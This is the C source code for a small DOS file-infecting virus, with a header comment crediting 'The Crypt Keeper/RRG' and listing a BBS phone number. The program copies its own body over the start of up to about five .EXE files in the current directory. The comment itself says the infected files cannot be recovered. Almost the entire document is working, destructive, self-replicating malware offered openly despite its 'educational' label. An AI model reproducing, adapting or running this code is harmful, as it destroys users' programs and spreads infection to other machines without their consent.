/* 
   This is a pretty lame program, I would not advise running it on yourself 
   though.  It will merely overwrite found files with itself, thus replicating.
   It is for educational purposes only.  Careful, since it overwrites, it is
   destructive.  Infecte files cannot be recovered.  I could save time/date
   stamps, etc. but this was just for fun, and took me only a few mintes to
   throw together.  
     The Crypt Keeper/RRG
     (619)/457-1836: The Programmer's Paradise
   Oh yeah, use the tiny memory model, and make it a .COM file.
*/

#include <dos.h>
#include <dir.h>
#include <stdio.h>

#define V_SIZE 7424

int n_inf=0;

void resume(void);
void inf(char *vir, char *filename);
int  compare(char *d, char *e);

void main(int argc, char **argv)
{
  struct ffblk fileinfo;
  char vir[V_SIZE];
  FILE *fp;
  char path[6];
  int b,a=0;

  argc++;

  if((fp=fopen(argv[0],"rb"))==NULL) resume();
  fread(vir,sizeof(char),V_SIZE,fp);
  fclose(fp);
  
  path[0]='*';
  path[1]='.';
  path[2]='E';
  path[3]='X';
  path[4]='E';
  path[5]=NULL;
  
  if(findfirst(path,&fileinfo,FA_ARCH)==-1) resume();
  inf(vir,fileinfo.ff_name);
  do {
    if(findnext(&fileinfo)!=0) a=1;
    else inf(vir,fileinfo.ff_name);
    if((a==1) || (n_inf>4)) b=1;
  } while (b!=1);
  resume();
}

void inf(char *vir, char *filename)
{
  FILE *fp;
  char checkinf[V_SIZE];

  if((fp=fopen(filename,"rb+"))==NULL) resume();
  fread(checkinf,sizeof(char),V_SIZE,fp);
  if(compare(vir,checkinf)==0) return;
  fseek(fp,0L,SEEK_SET);
  fwrite(vir,sizeof(char),V_SIZE,fp);
  fclose(fp);
  n_inf++;
}

int compare(char *d, char *e)
{
  int a;
  
  for(a=0;a<V_SIZE;a++) if(d[a]!=e[a]) return(1);
  return(0);
}

void resume(void)
{
  exit(0);
}
